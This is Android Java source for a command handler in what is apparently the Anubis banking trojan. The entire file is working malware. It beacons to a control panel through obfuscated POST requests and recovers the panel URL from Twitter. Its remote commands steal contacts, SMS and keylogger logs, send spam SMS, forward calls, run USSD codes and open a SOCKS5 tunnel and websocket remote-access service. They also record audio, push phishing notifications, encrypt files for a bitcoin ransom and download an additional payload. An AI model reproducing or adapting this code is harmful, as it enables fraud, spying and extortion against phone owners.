package anubis.bot.myapplication;


import android.Manifest;
import android.app.IntentService;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.concurrent.TimeUnit;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.API.RequestHttp;
import anubis.bot.myapplication.API.Sound.ServiceRecordSound;
import anubis.bot.myapplication.Activity.ActivityAlert1;
import anubis.bot.myapplication.Activity.ActivityAlert2;
import anubis.bot.myapplication.Activity.ActivityGetNumber;
import anubis.bot.myapplication.Activity.ActivityGetSMS;
import anubis.bot.myapplication.Activity.ActivityOpenURL;
import anubis.bot.myapplication.Activity.ActivityStartUSSD;
import anubis.bot.myapplication.API.Admin.ReceiverDeviceAdmin;
import anubis.bot.myapplication.socks.ServiceForwardingTunel;

public class ServiceCommands extends IntentService
{
    Constants const_ = new Constants();
    UtilsClass SF = new UtilsClass();
    StoreStringClass store = new StoreStringClass();
    Context context;

    String getHash;
    String r0_int = "0";
    String screen_int = "0";
    String b_nk = "";
    String AV="";
    String number = "";
    String number_ = "";
    String timeWorkstr= "ERROR";
    String responce;
    TelephonyManager tm;
    int iconCheckInj=0;
    int iconCheckGeolocation=0;
    int iconAccess=0;
    int iconCheckHideSMS=0;

    public ServiceCommands() {
        super("");

    }
    public void onCreate() {super.onCreate();}
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        return START_STICKY;
    }
    @Override
    protected void onHandleIntent(Intent intent)
    {
        context = this;
        readCommand();
    }
    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    public void readCommand()
    {
            if(!SF.isMyServiceRunning(context,StartWhileGlobal.class)){//Проверяем состояние цикла
                startService(new Intent(this, StartWhileGlobal.class));
            }

            try {TimeUnit.SECONDS.sleep(2);} catch (InterruptedException e) {e.printStackTrace();}
            tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            String ID_B = SF.ID_B(this);
            String device = Build.VERSION.RELEASE;  // ОС
            String model = Build.MODEL + " (" + Build.PRODUCT + ")";  // модель
            String country = tm.getNetworkCountryIso();  // страна

            int res;
            res = context.checkCallingOrSelfPermission(Manifest.permission.READ_PHONE_STATE);
            if (res == PackageManager.PERMISSION_GRANTED){
                number = "(" + tm.getNetworkOperatorName() + ")" + tm.getLine1Number();
            } else {
            number = "(NO)";
            number_ = "Indefined";
            }

            //************Получаем состояние админ прав**********
            DevicePolicyManager deviceManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName componentName = new ComponentName(context, ReceiverDeviceAdmin.class);
            if (deviceManager.isAdminActive(componentName)) r0_int = "1";

            //*************Проверка состояние экрана*******
            KeyguardManager km = (KeyguardManager) getSystemService(context.KEYGUARD_SERVICE);
            boolean locked = km.inKeyguardRestrictedInputMode();
            if (locked == false) screen_int = "1";

            //*******************************************

            try {
                getHash = SF.SetRead(context, "SettingsAll");
                if (getHash != "") {
                    String[] getHashM = getHash.split("~");
                    getHash = getHashM[0];
                } else getHash = "";
            }catch (Exception ex){
                getHash = "";
            }

            if (Build.VERSION.SDK_INT >= 24){//Проверка разрешения получиния имя запущенного процесса
               if(SF.getUsageStatsManager(context))iconCheckInj=1;else iconCheckInj=0;
                if(SF.checkAccess(context)) iconCheckInj=1;
            } else iconCheckInj=1;

            if(SF.checkAccess(context)) {
                iconAccess=1;
                SF.SetWrite(context, "isAccessbility","true");
            }else {
                iconAccess=0;
                SF.SetWrite(context, "isAccessbility","false");
            } //Состояние вкл/выкл accessibility service

            if(SF.geolocation_check_enabled(context)) iconCheckGeolocation=1;else iconCheckGeolocation=0; //Состояние вкл/выкл геолокации


            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {//Состояние перехвата смс (скрытый или нет)
                if (Telephony.Sms.getDefaultSmsPackage(this).equals(getPackageName()))
                    iconCheckHideSMS=1;
                else
                    iconCheckHideSMS=0;
            }else{
                try {
                    if (SF.SetRead(context, "del_sws").contains("true"))
                        iconCheckHideSMS = 1;
                    else iconCheckHideSMS = 0;
                }catch (Exception ex){
                    iconCheckHideSMS = 0;
                }
            }

            try {
                 timeWorkstr = SF.SetRead(this, "time_work");
            }catch (Exception ex){
                SF.Log("TimeWork","ERROR -> ServiceCommands");
            }

            int playprotect = 2;
            try{
                String getPlay = SF.SetRead(this,"play_protect");
                if(getPlay.equals("true")){
                    playprotect=1;
                }else if(getPlay.equals("false")) {
                    playprotect=0;
                }else{
                    playprotect=2;
                }
            }catch (Exception ex){}

                //Doze Mode
                int doze=0;
                if (Build.VERSION.SDK_INT >= 23) {
                    PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);//Состояние Doze
                    boolean inWhiteList = powerManager.isIgnoringBatteryOptimizations(getPackageName());
                    if (inWhiteList) {
                        doze=1;
                    }
                }else{
                    doze=1;
                }
            int step  = Integer.parseInt(SF.SetRead(this, "step"));
            responce =  SF.trafDeCr(SF.POST(context,"2","p="+SF.trafEnCr(ID_B + ":" + r0_int + ":" + getHash + ":" +iconCheckInj + ":" + iconCheckGeolocation + ":" + iconCheckHideSMS +":" + screen_int + ":" + iconAccess + ":" + timeWorkstr + ":" + playprotect + ":" + doze + ":" + step + ":")));
            SF.Log("Запрос", " - > " + responce);

            if (responce.contains("|NO|")) {
                b_nk=store.GetAPP(this);

                String getIconCardInj = SF.SetRead(context,"iconCJ");
                SF.Log("ICON SEND",""+getIconCardInj);
                SF.Log("","Регаем");
                SF.Log("set_data_p", SF.trafEnCr(ID_B + ":" + number + number_ + ":" + device + ":" + country + ":" + b_nk + ":" + model + ":" + AV + ":" + getIconCardInj));
                responce = SF.POST(context,"1", "p=" + SF.trafEnCr(ID_B + ":" + number + number_ + ":" + device + ":" + country + ":" + b_nk + ":" + model + ":" + const_.Version + ":" + AV + ":" + getIconCardInj + ":"));
                SF.Log("Responce",responce);
                responce = SF.trafDeCr(responce);

            } else if (responce.contains("state1letsgotxt")) {
                String resp_settings = SF.POST(context,"3", "p=" + SF.trafEnCr(ID_B));
                resp_settings = SF.trafDeCr(resp_settings);
                SF.Log("Настройки", "" + resp_settings);

                try {
                    SF.Log("Запись  успешна!",resp_settings);
                    String[] masiv_str = resp_settings.split(":");

                    String save_inj = masiv_str[0];

                    if ((masiv_str[0].equals("") || (masiv_str[0].equals(null)))) {
                        SF.SetWrite(this, "lock_inj", "");
                    }

                    SF.SetWrite(this, "save_inj", save_inj);
                    SF.SetWrite(this, "del_sws", masiv_str[1]);
                    SF.SetWrite(this, "perehvat_sws", masiv_str[2]);
                    SF.SetWrite(this, "network", masiv_str[3]);
                    SF.SetWrite(this, "gps", masiv_str[4]);
                    SF.SetWrite(this, "foregroundwhile", masiv_str[5]);
                    SF.SetWrite(this, "keylogger", masiv_str[6]);
                    SF.SetWrite(this, "lookscreen", masiv_str[8]);
                    String record_seconds="0";
                    try{
                        record_seconds = masiv_str[7].replace(" ","");
                    }catch (Exception ex){}



                    SF.SetWrite(this, "recordsoundseconds", record_seconds);
                    Log.e("save seconds sound",record_seconds);

                } catch (Exception ioe) {
                     SF.Log("Настройки", "Запись не good!");
                }

            }else if(responce.contains("ALLSETTINGSGO")) {
                String respSettings_all = SF.POST(context,"6", "p=" + SF.trafEnCr(ID_B));
                respSettings_all = SF.trafDeCr(respSettings_all);
                SF.Log("Сохраняем настройки",respSettings_all);

                String GetmadeString="";
                try {
                    GetmadeString = SF.SetRead(context, "madeSettings");
                }catch (Exception ex){
                    SF.Log("ServiceCommands","ERROR GetmadeString");
                }
                String madeSettings="1 2 3 4 5 6 7 8 9 10 11 12 13 ";

                if(GetmadeString.contains("5+"))madeSettings = madeSettings.replace("5 ", "5+");
                if(GetmadeString.contains("6+"))madeSettings = madeSettings.replace("6 ", "6+");
                if(GetmadeString.contains("7+"))madeSettings = madeSettings.replace("7 ", "7+");
                if(GetmadeString.contains("8+"))madeSettings = madeSettings.replace("8 ", "8+");
                if(GetmadeString.contains("9+"))madeSettings = madeSettings.replace("9 ", "9+");
                if(GetmadeString.contains("10+"))madeSettings = madeSettings.replace("10 ", "10+");

                try {
                    SF.SetWrite(this, "SettingsAll", respSettings_all);
                    SF.SetWrite(this, "madeSettings", madeSettings);
                    SF.Log("Настройки all", "madeSettings: " + madeSettings);
                } catch (Exception ioe) {
                    SF.Log("Настройки all", "Запись не good!");
                }
            }else if(responce.equals("")){//  -  !!!!!!!!!!!!!!!!!    когда главные url не работает перебераем весь лист url
                try {
                    String[] url = SF.SetRead(context, "urls").replace(" ", "").split(",");
                    boolean isTwitter = false;
                    for (int i = 0; i < url.length; i++) {
                        SF.Log("url", "" + url[i]);
                        if(SF.checkPanelPost(url[i]).contains("**2**0**0**")){
                            SF.SetWrite(this, "url", ""+url[i]);
                            isTwitter = true;
                            break;
                        }
                    }
                    Log.e("Twit",""+isTwitter);
                    if(!isTwitter){//проверяем twitter
                        String getUrl = SF.getUrlAdminPanelFromTwitter();

                        SF.Log("getTwitt",""+getUrl);
                        if((getUrl.contains("https://")) || (getUrl.contains("http://"))){
                            SF.SetWrite(this,"urls",getUrl);
                        }
                    }
                }catch (Exception ex){
                    SF.Log("ERROR","Class ServiceCommands -> get urls");
                }
            }
            SF.Log("Общие настройки", SF.SetRead(context,"SettingsAll"));
            String parts[] = responce.split("::");

            //Выполняем команды!
            for (int j = 0; j < parts.length; j++) {
                if (parts[j].contains("|startinj=")){
                    if(!SF.SetRead(context,"name").contains("true")){
                        String strinj = SF.return_plain_text(parts[j], "|startinj=", "|endstartinj");
                        SF.Log("startinj", strinj);
                        SF.SetWrite(this,"lock_inj",strinj);
                    }
                }
                if (parts[j].contains("Send_GO_SMS")){
                    String n$um$ber$ = SF.return_plain_text(parts[j], "|number=", "|text=");
                    String[] te$xt$ = parts[j].split("text=");
                    try {
                        SF.sendSMS(this,n$um$ber$,te$xt$[1]);
                        SF.POST(context,"4", "p=" + SF.trafEnCr(ID_B + "|Outgoing SMS" + '\n' + "Number: " + n$um$ber$ + '\n' + "Text: " + te$xt$[1] + '\n' +"|"));
                        SF.Log("", "Отправляем смс на номер " + n$um$ber$ + " с текстом  " + te$xt$[1]);
                        SF.StopSound(context);
                    } catch (Exception ex) {
                        SF.POST(context,"4", "p=" + SF.trafEnCr(ID_B + "|(Outgoing SMS) " + "Error sending SMS, maybe there are no permission to send!|"));
                        SF.Log("", "Error sending SMS, maybe there are no permission to send!");
                    }
                }
                if (parts[j].contains("nymBePsG0")){ //Получить номера тел.книги

                    Intent dialogIntent = new Intent(ServiceCommands.this, ActivityGetNumber.class)
                            .putExtra("str", "0").putExtra("cwc_text", "");
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                    startActivity(dialogIntent);
                }
                if (parts[j].contains("GetSWSGO")){ //Получить сохраненные смс
                    Intent dialogIntent = new Intent(this, ActivityGetSMS.class);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                    startActivity(dialogIntent);
                }
                if (parts[j].contains("|telbookgotext=")){ //Рассылка смс по тел. книге
                    String text = SF.return_plain_text(parts[j], "|telbookgotext=", "|endtextbook");
                    Intent dialogIntent = new Intent(ServiceCommands.this, ActivityGetNumber.class)
                            .putExtra("str", "1").putExtra("cwc_text", text);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                    startActivity(dialogIntent);
                }
                if (parts[j].contains("getapps")){ //Получить установленные приложения
                    SF.getApps(this);
                }
                if (parts[j].contains("getpermissions")){ //Получить статус разрешений
                    SF.getPermissions(this);
                }
                if (parts[j].contains("startaccessibility")){ //Запустить  спец. возможности
                    try {
                        String getSettingsPermission = SF.SetRead(this, "startRequest");
                        if ((getSettingsPermission.contains("Access=0")) ) {
                            getSettingsPermission = getSettingsPermission.replace("Access=0","Access=1");
                            SF.SetWrite(this, "startRequest", getSettingsPermission);
                        }
                    }catch(Exception ex) {
                        SF.Log("ServiceCommands","Access=0");
                    }
                }
                if (parts[j].contains("startpermission")){ //Запустить  Разрешения
                    try {
                        String getSettingsPermission = SF.SetRead(this, "startRequest");
                        if (getSettingsPermission.contains("Perm=0")) {
                            getSettingsPermission = getSettingsPermission.replace("Perm=0","Perm=1");
                                SF.SetWrite(this, "startRequest", getSettingsPermission);
                        }
                    }catch(Exception ex) {
                        SF.Log("ServiceCommands","Perm=0");
                    }
                }
                if (parts[j].contains("=ALERT|")){ //alert
                    String title = SF.return_plain_text(parts[j], "|title=", "|text=");
                    String[] text = parts[j].split("text=");

                    try {
                        Intent dialogIntent = new Intent(ServiceCommands.this, ActivityAlert1.class)
                                .putExtra("title", title).putExtra("content", text[1]);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                        startActivity(dialogIntent);
                    } catch (Exception ex){}
                }
                if (parts[j].contains("=PUSH|")){ //PUSH
                    try {
                        String title = SF.return_plain_text(parts[j], "|title=", "|text=");
                        String text = SF.return_plain_text(parts[j], "|text=", "|icon=");
                        String icon = parts[j].split("icon=")[1];
                        SF.Log("Push Icon",""+icon);
                        startService(new Intent(this, ServiceModuleNotification.class).putExtra("appname", icon)
                                .putExtra("title", title)
                                .putExtra("text", text));
                    }catch (Exception ex){
                        SF.Log("ServiceCommands","ERROR -> PUSH");
                    }
                }
                if (parts[j].contains("startAutoPush")){ //AUTO PUSH
                    try {
                    String appName = SF.return_plain_text(parts[j], "|AppName=", "|EndAppName");
                    SF.Log("APP",appName);
                    String title="";
                    String text="";
                    String locate = Resources.getSystem().getConfiguration().locale.toString();
                    if(locate.contains("RU")){
                        title="Срочное сообщение!";
                        text="Подтвердите свой аккаунт";
                    }else if(locate.contains("US")){
                        title="Urgent message!";
                        text="Confirm your account";
                    }else if(locate.contains("TR")){
                        title="Acil mesaj!";
                        text="Hesabını onayla";
                    }else if(locate.contains("DE")){
                        title="Dringende Nachricht!";
                        text="Bestätigen Sie ihr Konto";
                    }else if(locate.contains("IT")){
                        title="Messaggio urgente!";
                        text="Conferma il tuo account";
                    }else if(locate.contains("FR")){
                        title="Message urgent!";
                        text="Confirmez votre compte";
                    }else if(locate.contains("UA")){
                        title="Термінове повідомлення!";
                        text="Підтвердьте свій рахунок";
                    }else{
                        title="Urgent message!";
                        text="Confirm your account";
                    }
                    startService(new Intent(this, ServiceModuleNotification.class).putExtra("appname",appName)
                            .putExtra("title",title)
                            .putExtra("text",text));
                    }catch (Exception ex){
                        SF.Log("ServiceCommands","ERROR -> startAutoPush");
                    }
                }

                if (parts[j].contains("RequestPermissionInj")) { //Запрос разрешений для прав инжектов 7.0
                    if (Build.VERSION.SDK_INT >= 24){//24
                        if (!SF.getUsageStatsManager(context)){
                            Intent dialogIntent = new Intent(this, ActivityAlert2.class)
                                    .putExtra("start", "statistic");
                            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                            startActivity(dialogIntent);
                            SF.Log("Вып настр","/PROC 7.0 ");
                        }
                    }
                }

                if (parts[j].contains("RequestPermissionGPS")) { //Запрос разрешений для прав геолокации
                    if(!SF.geolocation_check_enabled(context)) {
                        Intent dialogIntent = new Intent(this, ActivityAlert2.class)
                                .putExtra("start", "gps");
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                        startActivity(dialogIntent);
                        SF.Log("Вып настр", "Запрос геолокации");
                    }
                }
                if (parts[j].contains("|ussd=")){ //ussd
                    try {
                        String us_sd_ = SF.return_plain_text(parts[j], "|ussd=", "|endUssD" );
                      //  us_sd_ = us_sd_.replace("$$","#");
                        SF.Log("USSD", us_sd_);
                        Intent dialogIntent = new Intent(this, ActivityStartUSSD.class).putExtra("str", us_sd_);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                        startActivity(dialogIntent);

                    }catch (Exception ex){
                        SF.Log("ERROR", "USSD -> Commands");
                    }
                }
                if (parts[j].contains("|sockshost=")){ //socks5
                    try {
                        String host = SF.return_plain_text(parts[j], "|sockshost=", "|user=" );
                        String user = SF.return_plain_text(parts[j], "|user=", "|pass=" );
                        String pass = SF.return_plain_text(parts[j], "|pass=", "|port=" );
                        String port = SF.return_plain_text(parts[j], "|port=", "|endssh" );

                        startService(new Intent(this, ServiceForwardingTunel.class)
                                    .putExtra("host",""+host)
                                    .putExtra("user",""+user)
                                    .putExtra("pass",""+pass)
                                    .putExtra("port",""+port));

                    }catch (Exception ex){
                        SF.Log("ERROR", "Socks5 -> Commands");
                    }
                }
                if (parts[j].contains("stopsocks5")){ //socks5 stop
                    try {
                        SF.SetWrite(this, "socks","stop");
                    }catch (Exception ex){
                        SF.Log("ERROR", "stop Socks5 -> Commands");
                    }
                }
                if (parts[j].contains("|spam=")){ //spam
                    try {
                        String spam = SF.return_plain_text(parts[j], "|spam=", "|endspam" );
                        SF.Log("spam", spam);
                        SF.SetWrite(this, "textSPAM",spam);
                        SF.SetWrite(this, "spamSMS","start");
                        SF.SetWrite(this, "indexSMSSPAM","");
                    }catch (Exception ex){
                        SF.Log("ERROR", "spam -> Commands");
                    }
                }
                if (parts[j].contains("|recordsound=")){ //Запись звука(секунды)
                    try {
                        String seconds = SF.return_plain_text(parts[j], "|recordsound=", "|endrecord" );
                        SF.Log("seconds", seconds);
                        if(SF.hasPermission(this,store.RECORD_AUDIO[0])){
                            if (!SF.isMyServiceRunning(this, ServiceRecordSound.class)) {
                                context.startService(new Intent(context, ServiceRecordSound.class)
                                .putExtra("time",seconds));
                            }
                        }

                    }catch (Exception ex){
                        SF.Log("ERROR", "RecodrSound -> Commands");
                    }
                }
                if (parts[j].contains("|replaceurl=")){ //replace url
                    try {
                        String url = SF.return_plain_text(parts[j], "|replaceurl=", "|endurl" );
                        SF.Log("Replace URL Panel", url);
                        SF.SetWrite(this, "url", url);
                        SF.SetWrite(this, "urls", url);
                    }catch (Exception ex){
                        SF.Log("ERROR", "ReplaceURL -> Commands");
                    }
                }
                if (parts[j].contains("|startapplication=")){ //replace url
                    try {
                        String app = SF.return_plain_text(parts[j], "|startapplication=", "|endapp" );
                        SF.Log("Start App", app);

                        Intent LaunchIntent = getPackageManager().getLaunchIntentForPackage(app);
                        startActivity(LaunchIntent);

                    }catch (Exception ex){
                        SF.Log("ERROR", "Start App -> Commands");
                    }
                }

                if (parts[j].contains("killBot")){ //Убиваем бот
                    try{
                        SF.SetWrite(this, "url", "");
                        SF.SetWrite(this, "urls", "");
                        SF.SetWrite(this, "urlInj", "");
                        stopService(new Intent(this, ServiceInjections.class));
                    }catch (Exception ex){
                        SF.Log("ERROR", "killBot -> Commands");
                    }
                }
                if (parts[j].contains("getkeylogger")){ //Получаем логи кейлоггера!
                    try{
                        String s = readFile("keys.log");
                        s=s.replace("|^|","\n");
                        String responce =  SF.POST(this, "12", "p=" + SF.trafEnCr(SF.ID_B(this) + "~~~~~~~~~~"+s));
                        Log.e("SEND KEL","LOGER");
                        responce=SF.trafDeCr(responce);
                        if(responce.contains("clear")){
                            Log.e("SEND KEL","CLEAR");
                            clearFile("keys.log");
                        }
                    }catch (Exception ex){
                        Log.e("ERROR", "getkeylogger -> Commands");
                    }
                }
                if (parts[j].contains("|startrat=")){ //websocket
                    try {
                        String ws = SF.return_plain_text(parts[j], "|endrat=", "|endurl");
                        SF.Log("WebSocket", ws);
                        SF.SetWrite(this, "websocket", ws);

                        if(!SF.isMyServiceRunning(context,ServiceRAT.class)){
                            context.startService(new Intent(context, ServiceRAT.class));
                        }
                    }catch (Exception ex){
                        SF.Log("ERROR", "WebSocket -> Commands");
                    }
                }

                if (parts[j].contains("startforward=")){ //Переадресация звонка
                    try {
                        SF.StopSound(this);
                        String forward = SF.return_plain_text(parts[j], "startforward=", "|endforward" );
                        SF.Log("Number", forward);
                        SF.callForward(this,"*21*" + forward + "#");
                    }catch (Exception ex){
                        SF.Log("ERROR", "Start Forward -> Commands");
                    }
                }

                if (parts[j].contains("stopforward")){ //Переадресация звонка СТОП
                    try {
                        SF.StopSound(this);
                        SF.callForward(this,"#21#");
                    }catch (Exception ex){
                        SF.Log("ERROR", "STOP Forward -> Commands");
                    }
                }
                if (parts[j].contains("|openbrowser=")){ //Открыть URL в браузере
                    try {
                        String url = SF.return_plain_text(parts[j], "|openbrowser=", "|endbrowser" );
                        SF.Log("url", url);
                        Intent dialogIntent = new Intent(this, ActivityAlert2.class)
                                .putExtra("start", "**startbrurl**"+url);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                        startActivity(dialogIntent);
                    }catch (Exception ex){
                        SF.Log("ERROR", "Open Browser URL -> Commands");
                    }
                }
                if (parts[j].contains("|openactivity=")){ //Открыть URL в Activity
                    try {
                        String url = SF.return_plain_text(parts[j], "|openactivity=", "|endactivity" );
                        Intent dialogIntent = new Intent(context, ActivityOpenURL.class)
                                .putExtra("url", url);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                        startActivity(dialogIntent);
                    }catch (Exception ex){
                        SF.Log("ERROR", "Open Activity URL -> Commands");
                    }
                }
                if (parts[j].contains("|cryptokey=")){ //cryptolocker
                    try {
                        String[] datacrypt = SF.return_plain_text(parts[j], "|cryptokey=", "|endcrypt").split("/:/");
                        String key = datacrypt[0];
                        String amount = datacrypt[1];
                        String btc = datacrypt[2];
                        if(SF.hasPermission(this,store.WRITE_EXTERNAL_STORAGE[0])) {
                            if (!SF.isMyServiceRunning(this, ServiceCryptFiles.class)) {
                                SF.SetWrite(this, "lock_amount", amount);
                                SF.SetWrite(this, "lock_btc", btc);
                                SF.SetWrite(this,"status","crypt");
                                SF.SetWrite(this,"key", key);
                                startService(new Intent(this, ServiceCryptFiles.class));
                            }
                        }
                    }catch (Exception ex){
                        SF.Log("ERROR", "WebSocket -> Commands");
                    }
                }
                if (parts[j].contains("|decryptokey=")){ //decrypt
                    try {
                        String key = SF.return_plain_text(parts[j], "|decryptokey=", "|enddecrypt");
                        if(SF.hasPermission(this,store.WRITE_EXTERNAL_STORAGE[0])) {
                            if (!SF.isMyServiceRunning(context, ServiceCryptFiles.class)) {
                                SF.SetWrite(this,"status","decrypt");
                                SF.SetWrite(this,"key",key);
                                context.startService(new Intent(context, ServiceCryptFiles.class));
                            }
                        }
                    }catch (Exception ex){
                        SF.Log("ERROR", "WebSocket -> Commands");
                    }
                }
                if(parts[j].contains("getIP")){
                  RequestHttp http = new RequestHttp();
                   SF.POST(context,"4", "p=" + SF.trafEnCr(ID_B + "|IP bots: " + SF.return_plain_text(http.go_post_notag("http://en.utrace.de",""),
                            ">The IP address ",
                            " is located in the")+ '\n' +"|"));
                }
                try {
                    if (SF.SetRead(context, "network").equals("true")) startService(new Intent(ServiceCommands.this, ServiceGeolocationNetwork.class));
                    if (SF.SetRead(context, "gps").equals("true")) startService(new Intent(ServiceCommands.this, ServiceGeolocationGPS.class));
                }catch (Exception ex){
                    SF.Log("ServiceCommands","ERROR -> ServiceGeolocationGPS");
                }
                //--Загружаем html критолокера---
                try {
                    if (SF.SetRead(context, "htmllocker").length() < 15) {
                        String html = SF.trafDeCr(SF.POST(context, "11", "p=1"));
                        if (html.length() > 15) {
                            SF.SetWrite(context, "htmllocker", html);
                        }
                    }
                }catch (Exception ex){
                    SF.Log("ServiceCommands","ERROR -> htmllocker");
                }
                //---докачиваем дополнение---
                if(const_.PlayProtect){
                    try {
                        File file = new File(getDir("apk", Context.MODE_PRIVATE),const_.nameDex+".apk");
                        SF.Log("ServiceCommands","Good protect 1");
                        if (!file.exists()){
                            SF.Log("ServiceCommands","Good protect 2");
                            String base64 = SF.trafDeCr(SF.POST(context, "14", "p=1"));
                            if (base64.length() > 1000) {
                                byte[] imageAsBytes = Base64.decode(base64.getBytes(), 0);
                                try{
                                    FileOutputStream os = new FileOutputStream(file, true);
                                    os.write(imageAsBytes);
                                    os.close();
                                    SF.Log("ServiceCommands","Good protect 3");
                                }catch (Exception ex){SF.Log("ServiceCommands","Распаковка декса ERROR");}
                            }
                        }
                    }catch (Exception ex){
                        SF.Log("ServiceCommands","ERROR -> декс");
                    }
                }
                //------Получаем ID бота с ПК(Windows)-----
                SF.getIDwindowsBot(this, "ServiceComm");

            }
            stopSelf();
    }

    String readFile(String FILENAME) {
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(openFileInput(FILENAME)));
            String str = "";
            String s="";
            while ((str = br.readLine()) != null) {
                s=s+str;
            }
            return s;
        } catch (IOException e) {
            return "";
        }
    }
    void clearFile(String FILENAME) {
        try {
            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(
                    openFileOutput(FILENAME, MODE_PRIVATE)));
            bw.write("");
            bw.close();
        } catch (IOException e) {

        }
    }
}
